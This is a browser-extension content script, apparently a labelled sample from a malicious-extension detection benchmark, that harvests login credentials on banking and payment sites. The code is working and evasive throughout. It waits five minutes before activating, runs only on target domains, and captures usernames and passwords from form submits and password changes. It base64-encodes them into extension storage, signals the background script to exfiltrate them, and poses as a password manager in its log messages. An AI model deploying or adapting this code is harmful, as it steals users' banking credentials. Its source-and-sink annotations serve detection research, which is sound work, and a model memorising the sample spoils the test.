// content.js - Credential harvesting with delayed and conditional triggers
// Frame: CS_1 (matches: https://*.bank.example/*, https://*.payment.example/*)
//
// Flow patterns exercised:
//   1. ELEMENT_VALUE (password) → [delay] → [encode] → CHROME_LOCAL_STORAGE (STORAGE_POSOING)
//   2. ELEMENT_VALUE → CHROME_RUNTIME_SENDMESSAGE (trigger exfiltration)
//
// Attack techniques:
//   - Delayed activation (5 minutes after page load)
//   - Conditional triggering (only on target domains)
//   - Base64 encoding (obfuscation)

import { isTargetDomain, INITIAL_DELAY } from "./config.js";
import { encodeData, generateSessionId, obfuscateFields } from "./utils.js";

let isActivated = false;
let capturedCredentials = [];
const sessionId = generateSessionId();

// ─── Delayed Activation ────────────────────────────────────────────
// Wait 5 minutes before activating credential harvesting
function delayedActivation() {
  setTimeout(() => {
    isActivated = true;
    console.log("[PWD-MGR] Secure sync activated");
    startMonitoring();
  }, INITIAL_DELAY);
}

// ─── Conditional Monitoring ────────────────────────────────────────
function startMonitoring() {
  if (!isTargetDomain(window.location.href)) {
    return;
  }

  document.addEventListener("submit", handleFormSubmit, true);

  const passwordInputs = document.querySelectorAll('input[type="password"]');
  passwordInputs.forEach(input => {
    input.addEventListener("change", handlePasswordChange);
  });
}

// ─── Form Submit Handler ───────────────────────────────────────────
// SOURCE: ELEMENT_VALUE (username, password fields)
function handleFormSubmit(event) {
  if (!isActivated) return;

  const form = event.target;
  const username = form.querySelector('input[type="text"], input[type="email"]');
  const password = form.querySelector('input[type="password"]');

  if (username && password && password.value) {
    const credential = {
      username: username.value,           // SOURCE: ELEMENT_VALUE
      password: password.value,           // SOURCE: ELEMENT_VALUE
      domain: window.location.hostname,
      url: window.location.href,
      timestamp: Date.now(),
      sessionId: sessionId
    };

    capturedCredentials.push(credential);
    storeCredential(credential);
  }
}

// ─── Password Change Handler ───────────────────────────────────────
function handlePasswordChange(event) {
  if (!isActivated) return;

  const passwordField = event.target;
  const form = passwordField.closest("form");

  if (form && passwordField.value) {
    const usernameField = form.querySelector('input[type="text"], input[type="email"]');

    if (usernameField && usernameField.value) {
      const credential = {
        username: usernameField.value,    // SOURCE: ELEMENT_VALUE
        password: passwordField.value,    // SOURCE: ELEMENT_VALUE
        domain: window.location.hostname,
        url: window.location.href,
        timestamp: Date.now(),
        sessionId: sessionId,
        trigger: "autofill"
      };

      capturedCredentials.push(credential);
      storeCredential(credential);
    }
  }
}

// ─── Store Credential ──────────────────────────────────────────────
// SINK: CHROME_LOCAL_STORAGE
function storeCredential(credential) {
  const obfuscated = obfuscateFields(credential);
  const encoded = encodeData(obfuscated);

  chrome.storage.local.get(["harvested"], (result) => {
    const existing = result.harvested || [];
    existing.push(encoded);

    chrome.storage.local.set({ harvested: existing }, () => {    // SINK CHROME_LOCAL_STORAGE
      console.log("[PWD-MGR] Credential securely stored");

      chrome.runtime.sendMessage({
        type: "CREDENTIAL_CAPTURED",
        count: existing.length
      });
    });
  });
}

// ─── Initialize ────────────────────────────────────────────────────
delayedActivation();
